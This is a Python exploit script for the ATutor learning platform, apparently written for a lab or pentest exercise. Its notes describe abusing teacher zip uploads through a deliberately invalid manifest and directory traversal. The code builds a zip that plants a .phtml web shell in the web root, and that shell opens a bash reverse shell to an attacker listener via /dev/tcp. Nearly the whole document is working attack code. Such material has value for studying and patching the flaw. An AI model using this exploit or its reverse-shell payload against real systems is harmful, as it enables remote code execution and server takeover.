"""

on atutor site zips are allowed to be uploaded when using a teacher account.
code validating the zip looks for a specific file inside the zip

$ims_manifest_xml = @file_get_contents($import_path.'ismanifest.xml');

From this we can see the zip must contian a file called ismanifest.xml

After looking at the code the web app does validate this ismanifest.xml file.
    - If it contains xml that is correct the zips contents will be uploaded and deleted later
    - If it contains xml that isn't correct the zip contents will stay on the web server.

    
File is stored in the contents directory we want to upload arbituary php code to the web dir

will use a directory traversal in the zip builder. when the app opens the zip it will open the file into tmp/poc/


Reqs:
    1. Web Root Path (var/www/html/atutor)
    2. Writable location in the web root (found by running find /var/www/html/ -type d -perm -o+v while sshed into machine)
        - Causing an error with paramter pollution is also a way to find this. sending an array in as a type instead of a string causing a warning messaged to be displayed
    3. File extension that can execute PHP
        - App uses whitelistest extensions which phtml isn't one of.

    4.Make PHP reach out to our netcat listener

"""
# file_contents = '<?php phpinfo(); ?>' Displays a bunch of php info
import zipfile
from io import BytesIO

def build_zip():
    # my_ip = input("IP: \n")
    my_ip = '192.168.152.128'
    # listening_port = input("Listening on: \n")
    listening_port = '4444'

    b = BytesIO()
    z = zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED)
    
    #creates file in zip. IF poc/test_file.txt will create folder and file inside zip
    #located at http://192.168.206.103/ATutor/mods/poc/poc.phtml
    #website has a list of illegal extensions which poc.phtml is not one of them
    file = '../../../../../var/www/html/ATutor/mods/poc/poc.phtml' 
    file_contents = f'<?php exec(\'bin/bash -c \"bash -i >& /dev/tcp/{my_ip}/{listening_port} 0>&1\"\'); ?>'
    print(file_contents)

    z.writestr(file, file_contents)
    z.writestr('imsmanifest.xml', 'invalid xml')
    z.close()

    zip = open('poc.zip', 'wb') #creates zip that holds the .writestr()'s
    zip.write(b.getvalue())

    zip.close()


build_zip()